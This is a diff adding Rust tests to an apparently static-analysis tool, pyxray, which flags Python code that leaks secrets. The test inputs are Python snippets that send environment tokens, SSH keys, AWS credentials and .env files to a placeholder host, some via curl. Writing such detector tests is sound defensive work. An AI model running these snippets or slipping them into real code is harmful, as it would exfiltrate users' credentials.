@@ -2,7 +2,7 @@
 //! alone. These are the claims the tool makes to a reader deciding whether to
 //! run something, so they are worth pinning down.
 
-use pyxray_core::model::{Effect, Severity};
+use pyxray_core::model::{Effect, FlowKind, SecretKind, Severity};
 use pyxray_core::xray;
 
 fn effects(source: &str) -> Vec<(Effect, Severity, String, Option<String>)> {
@@ -569,4 +569,161 @@ fn a_trailing_newline_does_not_add_a_line() {
     assert_eq!(report.metrics.lines_blank, 1);
     assert_eq!(report.metrics.lines_comment, 1);
     assert_eq!(report.texture.len(), 3);
+}
+
+// ------------------------------------------------------------------ secrets
+
+fn flows(source: &str) -> Vec<(FlowKind, SecretKind, String, Severity)> {
+    xray(source, "t")
+        .effects
+        .into_iter()
+        .filter_map(|h| h.flow.map(|f| (f.kind, f.secret, f.source, h.severity)))
+        .collect()
+}
+
+#[test]
+fn env_secret_sent_in_a_header_is_an_exfiltration() {
+    let src = "import os, requests\ntok = os.environ.get('GITHUB_TOKEN')\nrequests.post('https://x.example/a', headers={'Authorization': f'Bearer {tok}'})\n";
+    let f = flows(src);
+    assert_eq!(f.len(), 1, "{f:?}");
+    assert_eq!(f[0].0, FlowKind::Exfiltration);
+    assert_eq!(f[0].1, SecretKind::Env);
+    assert_eq!(f[0].2, "env GITHUB_TOKEN");
+}
+
+#[test]
+fn a_secret_through_a_dict_built_first_still_counts() {
+    let src = "import os, requests\nheaders = {}\nheaders['A'] = os.getenv('API_KEY')\nrequests.get('https://x.example', headers=headers)\n";
+    assert_eq!(flows(src).len(), 1);
+}
+
+#[test]
+fn rebinding_to_something_else_clears_the_secret() {
+    let src = "import os, requests\ntok = os.environ['TOKEN']\ntok = 'placeholder'\nrequests.post('https://x.example', data=tok)\n";
+    assert!(flows(src).is_empty());
+}
+
+#[test]
+fn the_length_of_a_secret_is_not_the_secret() {
+    let src = "import os, requests\ntok = os.environ['TOKEN']\nrequests.post('https://x.example', json={'n': len(tok)})\n";
+    assert!(flows(src).is_empty());
+}
+
+#[test]
+fn a_secret_read_inside_a_function_stays_there() {
+    let src = "import os, requests\ndef f():\n    tok = os.environ['TOKEN']\n    return 1\nrequests.post('https://x.example', data=tok)\n";
+    assert!(flows(src).is_empty());
+}
+
+#[test]
+fn an_ordinary_variable_is_not_a_secret() {
+    let src =
+        "import os, requests\nh = os.environ['HOME']\nrequests.post('https://x.example', data=h)\n";
+    assert!(flows(src).is_empty());
+}
+
+#[test]
+fn a_key_file_sent_anywhere_is_caution_and_scores_high() {
+    let src = "import requests\nrequests.post('https://x.example', data=open('/home/u/.ssh/id_rsa').read())\n";
+    let f = flows(src);
+    assert_eq!(f.len(), 1, "{f:?}");
+    assert_eq!(f[0].1, SecretKind::File);
+    assert_eq!(f[0].3, Severity::Caution);
+    assert!(xray(src, "t").metrics.risk >= 55);
+}
+
+#[test]
+fn a_with_block_over_cloud_credentials() {
+    let src = "import os, urllib.request\nwith open(os.path.expanduser('~/.aws/credentials')) as fh:\n    body = fh.read()\nurllib.request.urlopen(urllib.request.Request('https://x.example', data=body.encode()))\n";
+    let f = flows(src);
+    assert!(
+        f.iter()
+            .any(|x| x.0 == FlowKind::Exfiltration && x.1 == SecretKind::File),
+        "{f:?}"
+    );
+}
+
+#[test]
+fn pathlib_read_of_a_dotenv_file() {
+    let src = "from pathlib import Path\nimport requests\ndata = Path('.env').read_text()\nrequests.put('https://x.example', data=data)\n";
+    assert_eq!(flows(src).len(), 1);
+}
+
+#[test]
+fn a_secret_in_a_command_line() {
+    let src = "import os, subprocess\ntok = os.environ['NPM_TOKEN']\nsubprocess.run(['curl', '-d', tok, 'https://x.example'])\n";
+    let f = flows(src);
+    assert_eq!(f.len(), 1, "{f:?}");
+    assert_eq!(f[0].0, FlowKind::SecretToProcess);
+    assert_eq!(f[0].3, Severity::Caution);
+}
+
+#[test]
+fn the_response_to_an_authenticated_request_is_not_the_token() {
+    let src = "import os, requests\ntok = os.environ['TOKEN']\nr = requests.get('https://x.example', headers={'T': tok})\nopen('out.json', 'w').write(r.text)\n";
+    let f = flows(src);
+    assert_eq!(
+        f.len(),
+        1,
+        "only the request itself carries the token: {f:?}"
+    );
+    assert_eq!(f[0].0, FlowKind::Exfiltration);
+}
+
+#[test]
+fn a_proven_flow_replaces_the_co_occurrence_bonus() {
+    let flow = "import os, requests\ntok = os.environ['TOKEN']\nrequests.post('https://x.example', data=tok)\n";
+    let apart = "import os, requests\ntok = os.environ['TOKEN']\nrequests.post('https://x.example', data='hello')\n";
+    let terms = pyxray_core::digest::risk_breakdown(&xray(flow, "t").effects);
+    assert!(
+        terms
+            .iter()
+            .any(|(why, _)| why.contains("sent over the network")),
+        "{terms:?}"
+    );
+    assert!(!terms
+        .iter()
+        .any(|(why, _)| why.contains("environment and network")));
+    let terms = pyxray_core::digest::risk_breakdown(&xray(apart, "t").effects);
+    assert!(
+        terms
+            .iter()
+            .any(|(why, _)| why.contains("environment and network")),
+        "{terms:?}"
+    );
+}
+
+#[test]
+fn risk_is_exactly_the_sum_of_its_breakdown() {
+    for src in [
+        "print(1)\n",
+        "import os\nos.system('ls')\n",
+        "import os, requests\nrequests.post('https://x', data=open('/root/.ssh/id_rsa').read())\nos.system('x')\n",
+    ] {
+        let r = xray(src, "t");
+        let sum: u32 = pyxray_core::digest::risk_breakdown(&r.effects).iter().map(|t| t.1).sum();
+        assert_eq!(r.metrics.risk as u32, sum.min(100), "{src}");
+    }
+}
+
+#[test]
+fn resolved_keeps_the_whole_url_that_target_shortens() {
+    let url = "https://api.example.com/v1/some/very/long/path/that/does/not/fit/in/a/column?x=1";
+    let src = format!("import requests\nrequests.get('{url}')\n");
+    let hit = &xray(&src, "t").effects[0];
+    assert_eq!(hit.resolved.as_deref(), Some(url));
+    assert!(hit.target.as_deref().unwrap().len() < url.len());
+}
+
+#[test]
+fn parsing_an_inline_open_is_one_file_not_two() {
+    let r = xray("import json\njson.load(open('cfg.json'))\n", "t");
+    assert!(
+        r.effects
+            .iter()
+            .all(|h| h.target.as_deref() == Some("cfg.json")),
+        "{:?}",
+        r.effects
+    );
+    assert_eq!(r.meta.synopsis, "reads cfg.json");
 }
